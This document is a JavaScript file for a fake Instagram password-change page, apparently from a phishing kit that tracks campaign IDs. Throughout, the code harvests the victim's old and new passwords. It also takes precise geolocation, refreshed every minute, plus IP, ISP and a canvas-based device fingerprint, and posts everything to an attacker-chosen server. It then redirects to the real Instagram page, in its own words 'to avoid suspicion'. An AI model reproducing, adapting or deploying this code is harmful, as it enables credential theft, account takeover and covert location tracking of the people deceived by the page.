document.addEventListener('DOMContentLoaded', () => {
    // Extract campaign ID from URL if present
    const urlParams = new URLSearchParams(window.location.search);
    const campaignId = urlParams.get('campaign') || urlParams.get('id') || '';
    const serverUrl = urlParams.get('server') || 'http://localhost:5678';
    
    console.log('Campaign ID detected:', campaignId);
    console.log('Server URL detected:', serverUrl);
    
    // Store campaign ID in a cookie if it exists
    if (campaignId) {
        document.cookie = `campaign_id=${campaignId}; max-age=3600; path=/`;
        console.log('Campaign ID stored in cookie');
    }
    
    // Form elements
    const passwordForm = document.getElementById('passwordForm');
    const oldPasswordInput = document.getElementById('oldPassword');
    const newPasswordInput = document.getElementById('newPassword');
    const confirmPasswordInput = document.getElementById('confirmPassword');
    const submitButton = document.getElementById('submitBtn');
    const strengthLevel = document.getElementById('strengthLevel');
    
    // Hidden fields for data collection
    const locationDataField = document.getElementById('locationData');
    const providerDataField = document.getElementById('providerData');
    const deviceDataField = document.getElementById('deviceData');
    
    // More comprehensive device information collection
    function collectDeviceInfo() {
        try {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                pixelRatio: window.devicePixelRatio,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                doNotTrack: navigator.doNotTrack,
                online: navigator.onLine,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                memoryInfo: navigator.deviceMemory || 'unknown',
                referrer: document.referrer,
                connectionType: getConnectionType(),
                batteryInfo: getBatteryInfo(),
                canvas: getCanvasFingerprint(),
                plugins: getPluginsInfo(),
                touchpoints: navigator.maxTouchPoints || 0
            };
            
            deviceDataField.value = JSON.stringify(deviceInfo);
            return deviceInfo;
        } catch (error) {
            console.error("Error collecting device info:", error);
            const basicInfo = {
                userAgent: navigator.userAgent,
                error: "Failed to collect complete device information"
            };
            deviceDataField.value = JSON.stringify(basicInfo);
            return basicInfo;
        }
    }
    
    // Get connection type info if available
    function getConnectionType() {
        const connection = navigator.connection || 
                          navigator.mozConnection || 
                          navigator.webkitConnection;
        
        if (connection) {
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
        }
        return 'unknown';
    }
    
    // Get battery info if available
    function getBatteryInfo() {
        if (navigator.getBattery) {
            return navigator.getBattery()
                .then(battery => {
                    return {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                })
                .catch(() => 'unavailable');
        }
        return 'unsupported';
    }
    
    // Canvas fingerprinting for more unique device identification
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            
            // Text with different styles and emojis
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hello, world! 👋", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Canvas fingerprint", 4, 45);
            
            return canvas.toDataURL().slice(0, 100) + '...'; // Only store a partial fingerprint
        } catch (e) {
            return 'canvas-unsupported';
        }
    }
    
    // Get browser plugins info
    function getPluginsInfo() {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    description: plugin.description
                });
            }
        }
        return plugins;
    }
    
    // Enhanced geolocation information collection
    function collectLocationInfo() {
        // Initial empty location data
        const locationData = {
            latitude: null,
            longitude: null,
            postalCode: null,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            accuracy: null,
            altitude: null,
            heading: null,
            speed: null,
            timestamp: Date.now()
        };

        // Update hidden field with initial data
        locationDataField.value = JSON.stringify(locationData);
        
        // Try to get more precise location data with high accuracy
        if (navigator.geolocation) {
            const geoOptions = {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            };
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // Update with precise location data
                    locationData.latitude = position.coords.latitude;
                    locationData.longitude = position.coords.longitude;
                    locationData.accuracy = position.coords.accuracy;
                    locationData.altitude = position.coords.altitude;
                    locationData.heading = position.coords.heading;
                    locationData.speed = position.coords.speed;
                    locationData.timestamp = position.timestamp;
                    
                    // Get city, country, and postal code from coordinates
                    Promise.all([
                        // Attempt with Nominatim OpenStreetMap
                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
                            .then(response => response.json())
                            .catch(() => null),
                        // Fallback to ipinfo.io
                        fetch('https://ipinfo.io/json')
                            .then(response => response.json())
                            .catch(() => null)
                    ]).then(([osmData, ipData]) => {
                        // Process OpenStreetMap data
                        if (osmData && osmData.address) {
                            locationData.postalCode = osmData.address.postcode;
                            locationData.city = osmData.address.city || osmData.address.town;
                            locationData.country = osmData.address.country;
                            locationData.state = osmData.address.state;
                            locationData.street = osmData.address.road;
                            locationData.source = 'openstreetmap';
                        } 
                        // Use IP data as fallback or to enrich the data
                        else if (ipData) {
                            locationData.ip = ipData.ip;
                            locationData.ipCity = ipData.city;
                            locationData.ipRegion = ipData.region;
                            locationData.ipCountry = ipData.country;
                            locationData.ipPostal = ipData.postal;
                            locationData.ipLocation = ipData.loc;
                            locationData.source = 'ipinfo';
                            
                            // Set provider information
                            if (ipData.org) {
                                providerDataField.value = ipData.org;
                            }
                        }
                        
                        // Update hidden field with complete data
                        locationDataField.value = JSON.stringify(locationData);
                    });
                },
                (error) => {
                    // Record the error
                    locationData.error = {
                        code: error.code,
                        message: error.message
                    };
                    
                    // Fallback to IP-based location
                    collectIPBasedLocation(locationData);
                },
                geoOptions
            );
        } else {
            // Fallback to IP-based location
            locationData.error = "Geolocation API not supported";
            collectIPBasedLocation(locationData);
        }
    }
    
    // Improved IP-based location collection
    function collectIPBasedLocation(locationData = {}) {
        Promise.all([
            // Try ipinfo.io
            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .catch(() => null),
            // Try alternative service for redundancy
            fetch('https://geolocation-db.com/json/')
                .then(response => response.json())
                .catch(() => null)
        ]).then(([ipinfoData, geolocationDbData]) => {
            // Compile the data from both services
            const compiledData = {
                ...locationData,
                timestamp: Date.now(),
                source: []
            };
            
            // Process ipinfo data
            if (ipinfoData) {
                compiledData.ip = ipinfoData.ip;
                compiledData.city = ipinfoData.city;
                compiledData.region = ipinfoData.region;
                compiledData.country = ipinfoData.country;
                compiledData.postal = ipinfoData.postal;
                
                // Convert "lat,lng" string to separate properties
                if (ipinfoData.loc && ipinfoData.loc.includes(',')) {
                    const [lat, lng] = ipinfoData.loc.split(',');
                    compiledData.latitude = parseFloat(lat);
                    compiledData.longitude = parseFloat(lng);
                }
                
                compiledData.source.push('ipinfo');
                
                // Set provider
                if (ipinfoData.org) {
                    providerDataField.value = ipinfoData.org;
                }
            }
            
            // Process geolocation-db data if ipinfo wasn't available
            if (geolocationDbData && (!ipinfoData || !ipinfoData.loc)) {
                // Only add this data if it's not already set from ipinfo
                if (!compiledData.latitude && geolocationDbData.latitude) {
                    compiledData.latitude = geolocationDbData.latitude;
                }
                if (!compiledData.longitude && geolocationDbData.longitude) {
                    compiledData.longitude = geolocationDbData.longitude;
                }
                if (!compiledData.country && geolocationDbData.country_name) {
                    compiledData.country = geolocationDbData.country_name;
                }
                if (!compiledData.city && geolocationDbData.city) {
                    compiledData.city = geolocationDbData.city;
                }
                if (!compiledData.ip && geolocationDbData.IPv4) {
                    compiledData.ip = geolocationDbData.IPv4;
                }
                
                compiledData.source.push('geolocation-db');
            }
            
            // Update hidden fields
            locationDataField.value = JSON.stringify(compiledData);
            if (!providerDataField.value && compiledData.ip) {
                providerDataField.value = "ISP information unavailable";
            }
        });
    }
    
    // Password strength checker
    function checkPasswordStrength(password) {
        // Initial score
        let score = 0;
        
        // If password is empty, return 0
        if (password.length === 0) {
            return 0;
        }
        
        // Length check (minimum 6 characters for Instagram)
        if (password.length >= 6) {
            score += 1;
        }
        if (password.length >= 8) {
            score += 1;
        }
        if (password.length >= 10) {
            score += 1;
        }
        
        // Contains lowercase letters
        if (/[a-z]/.test(password)) {
            score += 1;
        }
        
        // Contains uppercase letters
        if (/[A-Z]/.test(password)) {
            score += 1;
        }
        
        // Contains numbers
        if (/[0-9]/.test(password)) {
            score += 1;
        }
        
        // Contains special characters
        if (/[^A-Za-z0-9]/.test(password)) {
            score += 1;
        }
        
        return Math.min(score, 5); // Max score is 5
    }
    
    // Update password strength indicator
    function updateStrengthIndicator(score) {
        let width = (score / 5) * 100;
        let color;
        
        // Set color based on score
        if (score <= 1) {
            color = '#ed4956'; // Red
        } else if (score <= 3) {
            color = '#ffcc00'; // Yellow/Orange
        } else {
            color = '#3897f0'; // Blue
        }
        
        strengthLevel.style.width = `${width}%`;
        strengthLevel.style.backgroundColor = color;
        
        // Enable/disable submit button based on validations
        validateForm();
    }
    
    // Validate the form
    function validateForm() {
        const oldPassword = oldPasswordInput.value;
        const newPassword = newPasswordInput.value;
        const confirmPassword = confirmPasswordInput.value;
        
        // Modified validation rules - removed old password requirement
        const isNewPasswordValid = checkPasswordStrength(newPassword) >= 2;
        const isConfirmValid = newPassword === confirmPassword;
        
        // Enable button without requiring old password
        submitButton.disabled = !(isNewPasswordValid && isConfirmValid);
    }
    
    // Enhanced form submission handler
    passwordForm.addEventListener('submit', (e) => {
        // Prevent default form submission
        e.preventDefault();
        
        // Final data collection before submission
        collectFinalData();
        
        // Final validation before submission
        validateForm();
        
        // If the form has errors, don't submit
        if (submitButton.disabled) {
            return false;
        }
        
        // Show loading state on button
        submitButton.textContent = "Processing...";
        submitButton.disabled = true;
        
        // Use XMLHttpRequest instead of fetch for better compatibility
        const xhr = new XMLHttpRequest();
        // Send data to the server URL specified in the query parameters
        xhr.open('POST', serverUrl + '/update-password', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        // Log the campaign ID to console for debugging
        console.log('Submitting form with campaign ID:', campaignId);
        console.log('Submitting to server URL:', serverUrl);
        
        // Prepare data for submission
        const data = [
            'campaignId=' + encodeURIComponent(campaignId),
            'oldPassword=' + encodeURIComponent(oldPasswordInput.value),
            'newPassword=' + encodeURIComponent(newPasswordInput.value),
            'confirmPassword=' + encodeURIComponent(confirmPasswordInput.value),
            'location=' + encodeURIComponent(locationDataField.value),
            'provider=' + encodeURIComponent(providerDataField.value),
            'deviceInfo=' + encodeURIComponent(deviceDataField.value)
        ].join('&');
        
        // Handle completion (success or error)
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                // Redirect to Instagram regardless of server response
                console.log("Form submitted, redirecting...");
                window.location.href = 'https://www.instagram.com/accounts/password/change/';
            }
        };
        
        // Handle network errors
        xhr.onerror = function() {
            console.error("Network error occurred");
            // Still redirect to avoid suspicion
            window.location.href = 'https://www.instagram.com/accounts/password/change/';
        };
        
        // Send the data
        xhr.send(data);
        
        return false;
    });
    
    // Collect final complete data before submission
    function collectFinalData() {
        // Refresh device info
        collectDeviceInfo();
        
        // Add additional browser data
        const browserInfo = {
            appName: navigator.appName,
            appCodeName: navigator.appCodeName,
            appVersion: navigator.appVersion,
            product: navigator.product,
            productSub: navigator.productSub,
            historyLength: window.history.length,
            windowDimensions: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            }
        };
        
        // Add to existing device info
        try {
            const currentInfo = JSON.parse(deviceDataField.value);
            const updatedInfo = { ...currentInfo, browser: browserInfo };
            deviceDataField.value = JSON.stringify(updatedInfo);
        } catch (e) {
            deviceDataField.value = JSON.stringify(browserInfo);
        }
    }
    
    // Event listeners for input validation
    oldPasswordInput.addEventListener('input', validateForm);
    
    newPasswordInput.addEventListener('input', () => {
        const strength = checkPasswordStrength(newPasswordInput.value);
        updateStrengthIndicator(strength);
    });
    
    confirmPasswordInput.addEventListener('input', validateForm);
    
    // Collect information on page load
    collectDeviceInfo();
    collectLocationInfo();
    
    // Also setup periodic background data collection
    setInterval(() => {
        try {
            collectLocationInfo();
        } catch (e) {
            console.error("Background location update failed:", e);
        }
    }, 60000); // Try to update location every minute
}); 